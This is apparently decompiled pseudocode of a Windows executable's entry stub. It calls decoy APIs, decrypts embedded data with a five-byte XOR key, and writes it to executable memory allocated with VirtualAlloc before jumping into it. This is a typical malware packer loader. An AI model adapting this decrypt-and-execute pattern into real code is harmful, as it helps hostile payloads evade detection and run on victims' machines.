__size32 proc1(unsigned char *param1, unsigned int param2, __size32 param3, __size32 *param4, unsigned int param5, __size8 *param6, char param7, int param8);

// address: 0x1310e09b
int main(int argc, char *argv[], char *envp[]) {
    __size8 al; 		// r8
    __size16 ax; 		// r0
    char bl; 		// r11
    __size8 cl; 		// r9
    __size16 cx; 		// r1
    unsigned char dl; 		// r10
    __size16 dx; 		// r2
    unsigned char *eax; 		// r24
    void *eax_1; 		// r24{45}
    __size32 eax_2; 		// r24{185}
    __size32 eax_3; 		// r24{486}
    __size32 ebp; 		// r29
    int ebx; 		// r27
    char *ebx_1; 		// r27
    int ebx_2; 		// r27{84}
    __size32 ecx_1; 		// r25{18}
    unsigned int edi; 		// r31
    char *edi_1; 		// r31
    unsigned int edi_2; 		// r31{116}
    unsigned int edx; 		// r26
    unsigned char *esi; 		// r30
    int esp; 		// r28
    void *esp_1; 		// r28{67}
    void *esp_2; 		// r28{309}
    void *esp_3; 		// r28{541}
    void *esp_4; 		// r28{559}
    __size32 local0; 		// m[esp - 16]
    unsigned int local1; 		// m[esp - 8]
    __size8 local10; 		// m[esp - 560]
    __size8 local11; 		// m[esp - 562]
    __size8 local12; 		// m[esp - 563]
    __size8 local13; 		// m[esp - 564]
    int local14; 		// m[esp - 572]
    unsigned int local15; 		// m[esp - 580]
    unsigned char *local16; 		// m[esp - 584]
    void *local17; 		// m[esp - 588]
    __size32 local18; 		// m[esp - 596]
    unsigned int local19; 		// m[esp - 600]
    unsigned char *local2; 		// m[esp - 12]
    unsigned char *local20; 		// m[esp - 608]
    void *local21; 		// m[esp - 612]
    __size32 local22; 		// m[esp - 780]
    __size32 local23; 		// m[esp - 784]
    int local24; 		// m[esp - 788]
    __size32 local25; 		// m[esp - 792]
    unsigned int local26; 		// m[esp - 796]
    unsigned int local27; 		// m[esp - 800]
    unsigned int local28; 		// m[esp - 804]
    union { void * x151; int x152; } local29; 		// m[esp - 576]
    unsigned int local3; 		// m[esp - 20]
    unsigned int local30; 		// m[esp - 776]
    int local35; 		// m[esp - 584]
    int local4; 		// m[esp - 24]
    char *local5; 		// m[esp - 28]
    unsigned int local58; 		// m[esp - 8]{573}
    __size32 local6; 		// m[esp - 32]
    void *local63; 		// esp_3{541}
    unsigned int local64; 		// local1{603}
    union { unsigned char * x149; int x150; } local65; 		// local16{607}
    union { int x143; __size32 * x144; } local7; 		// m[esp - 36]
    void *local8; 		// m[esp - 40]
    unsigned char *local9; 		// m[esp - 44]

    ecx_1 = SetErrorMode();
    WmiReceiveNotificationsA();
    GetStartupInfoA();
    eax_1 = SafeArrayGetUBound();
    local29 = eax_1 - 0x2fe67;
    eax = WmiSetSingleInstanceW(); /* Warning: also results in edx, esp_1 */
    local63 = esp_1;
    if ( !(edx == 0x3ec0000 || eax - 0x7ffbfe67 != eax_1 - 0x2fe67)) {
        local13 = -15;
        local12 = 28;
        local10 = 117;
        local29 = eax_1 - 0x6cf61957;
        ebx_2 = *(eax_1 - 0x6cf61957);
        local14 = ebx_2;
        bl = proc1(&ebx_2, esp - 572, 4, &local0, 0, &-15, bl, ebx_2);
        local8 = esp;
        local11 = -26;
        edi_2 = *(eax_1 - 0x6cf61953);
        local19 = edi_2;
        bl = proc1(&edi_2, (esp - 604), 4, &local0, 4, &-15, bl, esp - 600);
        edi = *(eax_1 - 0x6cf6194f);
        local3 = edi;
        bl = proc1(&edi, esp - 28, 4, &local0, 8, &-15, bl, esp - 28);
        local30 = 0;
        eax_2 = GetModuleHandleA();
        local6 = eax_2;
        local18 = eax_2 + 0x1000;
        eax = *(eax_1 - 0x6cf6194b);
        bl = proc1(&eax, esp - 40, 4, &local0, 12, &-15, bl, esp - 28); /* Warning: also results in ebx */
        local5 = eax + eax_2;
        esi = *(eax_1 - 0x6cf61947);
        local16 = esi;
        local27 = esp - 584;
        ax = proc1(&esi, esp - 600, 4, &local0, 16, &-15, bl, ebx); /* Warning: also results in cx, dx, al, cl, bl */
        local17 = 20;
        local7 = eax_1 - 0x6cf61943;
        local9 = edi * 8 + 12;
        local22 = 64;
        local23 = 0x3000;
        ebx = edi * 8 + edi_2 + 12;
        local24 = ebx + ebx_2;
        local25 = 0;
        eax = VirtualAlloc(0, ebx + ebx_2, 0x3000, 64); /* Warning: also results in esp_2 */
        local63 = esp_2;
        local20 = eax;
        edi_1 = eax + eax_2 + edi * 8 + 12;
        local2 = edi_1;
        local15 = edi * 8 + 12;
        local21 = edi * 8 + 12;
        local1 = 0;
        local4 = 0;
    }
    for(;;) {
        esp_3 = local63;
        local58 = local1;
        local64 = local58;
        local65 = local16;
        if (local21 != local16) {
            goto L0;
        }
        local1 = local58 + 1;
        local64 = local1;
        if (local1 == local3) {
            *(union { void * x171; int x172; }*)(esp_3 - 4) = esp - 564;
            *(unsigned char **)(esp_3 - 8) = local9;
            *(union { void * x173; int x174; }*)(esp_3 - 12) = (esp - 568);
            *(unsigned int*)(esp_3 - 16) = local19;
            ecx = local20 - local9;
            *(int*)(esp_3 - 20) = ecx;
            *(unsigned char **)(esp_3 - 24) = local20;
            eax_3 = proc1(*(esp_3 - 24), *(esp_3 - 20), *(esp_3 - 16), *(esp_3 - 12), *(esp_3 - 8), *(esp_3 - 4), bl, esp - 568); /* Warning: also results in ax, cx, dx, al, cl, bl, edx, edi */
            *(void **)(esp_3 - 4) = local8;
            *(union { void * x175; int x176; }*)(esp_3 - 8) = esp - 564;
            *(unsigned int*)(esp_3 - 12) = local19;
            *(int*)(esp_3 - 16) = local14;
            *(unsigned char **)(esp_3 - 20) = local20;
            esi = local20 + local19;
            *(void **)(esp_3 - 24) = esi;
            (*local20 + 0xf50)(local28, local27, local26, local25, local24, local23, local22, local30, 0x15000, 0, 0x5d000000, 0xe6000, 0x370000, 0x328000, 0, 0x6c000, 0x12c00, (esp - 660), 0, ecx_1, 0x5c000000, (esp - 544), eax, local20 + 0xf50, local20 + 0xf50, local21, local20, local19, local18, local17, local16, local15, local29, local14, local13, local12, local11, -38, local10, local9, local8, local7, local6, local5, local4, local3, local0, local2, local58 + 1, ebp, argc, argv, envp, ax, cx, dx, al, cl, (unsigned char) local58 + 1, bl, eax_3, local14, edx, local20, esp - 4, esi, edi, ADDFLAGS32(local20, local19, esi), ADDFLAGS32(local20, local19, esi), ADDFLAGS32(local20, local19, esi));
            return eax;
        }
        edx = *local7;
        *(union { void * x159; int x160; }*)(esp_3 - 4) = esp - 564;
        *(void **)(esp_3 - 8) = local17;
        *(union { void * x161; int x162; }*)(esp_3 - 12) = esp - 16;
        *(__size32*)(esp_3 - 16) = 4;
        esi = esp - local17 - 28;
        *(union { unsigned char * x147; int x148; }*)(esp_3 - 20) = esi;
        *(union { void * x163; int x164; }*)(esp_3 - 24) = esp - 28;
        bl = proc1(*(esp_3 - 24), *(esp_3 - 20), *(esp_3 - 16), *(esp_3 - 12), *(esp_3 - 8), *(esp_3 - 4), bl, esp - 28);
        ebx_1 = edx + local6;
        local5 = ebx_1;
        local17 += 4;
        local7 += 4;
        ebx = *local7;
        local35 = ebx;
        *(union { void * x165; int x166; }*)(esp_3 - 4) = esp - 564;
        *(void **)(esp_3 - 8) = local17;
        *(union { void * x167; int x168; }*)(esp_3 - 12) = esp - 16;
        *(__size32*)(esp_3 - 16) = 4;
        edi = esp - local17 - 584;
        *(int*)(esp_3 - 20) = edi;
        *(union { void * x169; int x170; }*)(esp_3 - 24) = esp - 584;
        ax = proc1(*(esp_3 - 24), *(esp_3 - 20), *(esp_3 - 16), *(esp_3 - 12), *(esp_3 - 8), *(esp_3 - 4), bl, ebx); /* Warning: also results in cx, dx, al, cl, bl */
        local65 = local35;
        local17 += 4;
        local7 += 4;
        local21 = 0;
        local2 = ebx_1;
L0:
        esp_4 = esp_3;
        local1 = local64;
        local16 = local65;
        ebx_1 = local20 + local4;
        dl = *local2;
        *(unsigned char*)ebx_1 = dl;
        local2++;
        local4++;
        local21++;
        local15++;
        local63 = esp_4;
        local63 = esp_4;
    }
}

// address: 0x1310e000
__size32 proc1(unsigned char *param1, unsigned int param2, __size32 param3, __size32 *param4, unsigned int param5, __size8 *param6, char param7, int param8) {
    char bl; 		// r11
    char cl; 		// r9
    short cx; 		// r1
    short dx; 		// r2
    int ebx; 		// r27
    unsigned int ecx; 		// r25
    __size32 *edi; 		// r31
    int edi_1; 		// r31
    unsigned int edx; 		// r26
    short local0; 		// m[esp - 16]
    unsigned int local1; 		// m[esp + 8]
    unsigned char *local10; 		// param1{150}
    __size32 local11; 		// local6{152}
    unsigned char *local2; 		// m[esp + 4]
    __size32 local3; 		// m[esp + 12]
    unsigned char *local4; 		// m[esp - 36]
    unsigned char local5; 		// m[esp - 17]
    __size32 local6; 		// m[esp + 12]{152}
    char local7; 		// param7{131}
    int local8; 		// param8{135}
    union { __size32 * x7; int x8; } local9; 		// edi{138}

    edi = param4;
    *(__size32*)param4 = param3;
    edx = (param5) % 5;
    dx = (unsigned short) (param5) % 5;
    local0 = dx;
    ecx = param2 + param5;
    cl = (unsigned char) ecx;
    cx = (unsigned short) ecx;
    local1 = ecx;
    local7 = param7;
    local8 = param8;
    local9 = edi;
    local10 = param1;
    local11 = param3;
    param7 = local7;
    param8 = local8;
    edi = local9;
    param1 = local10;
    local6 = local11;
    local3 = local6 - 1;
    local11 = local3;
    while (local6 != 0) {
        bl = *local1;
        edi_1 = (int) local0;
        local4 = edi_1 + param6;
        edx = *(unsigned char*)local4;
        dx = (unsigned short) edx;
        local5 = (unsigned char) (int) bl ^ edx;
        *(unsigned char*)param1 = local5;
        ecx = ((int) bl ^ edx) >> 16 & 0xffff | (local0);
        cx = local0 + 1;
        cl = (unsigned char) ecx;
        local0++;
        edi_1 = (int) local0;
        local9 = edi_1;
        if (edi_1 == 5) {
            local0 = 0;
        }
        local2 = param1 + 1;
        local1++;
        ebx = edi_1;
        bl = (unsigned char) edi_1;
        local7 = bl;
        local8 = ebx;
        local10 = local2;
        param7 = local7;
        param8 = local8;
        edi = local9;
        param1 = local10;
        local6 = local11;
        local3 = local6 - 1;
        local11 = local3;
    }
    return local6; /* WARNING: Also returning: ax := (unsigned short) local6, cx := cx, dx := dx, al := (unsigned char) local6, cl := cl, bl := param7, edx := edx, ebx := param8, edi := edi */
}

